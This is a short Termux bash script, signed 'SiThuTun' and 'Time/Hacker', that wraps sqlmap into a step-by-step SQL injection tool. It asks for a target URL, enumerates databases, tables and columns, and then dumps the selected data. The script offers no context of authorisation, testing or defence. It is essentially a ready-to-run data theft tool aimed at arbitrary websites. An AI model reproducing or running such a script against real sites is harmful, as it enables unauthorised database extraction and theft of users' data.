#!/data/data/com.termux/files/usr/bin/bash

toilet -f slant --gay "SiThuTun"

echo "Target site (Exam - www.facebook.com.php?id=10 )"

read site

cd sqlmap

python2 sqlmap.py -u $site --dbs

toilet -f slant --gay "SiThuTun"

echo "tables"

read db

python2 sqlmap.py -u $site -D $db --tables

toilet -f slant --gay "SiThuTun"

echo "columns"

read tb

python2 sqlmap.py -u $site -D $db -T $tb --columns

toilet -f slant --gay "SiThuTun"

echo "dump data"

read col

python2 sqlmap.py -u $site -D $db -T $tb -C $col --dump

echo "Nice For Tool Using give me Feedback"

echo "https://m.me/TimeHacker.199"

cowsay -f kiss.cow "Time/Hacker™"

:
: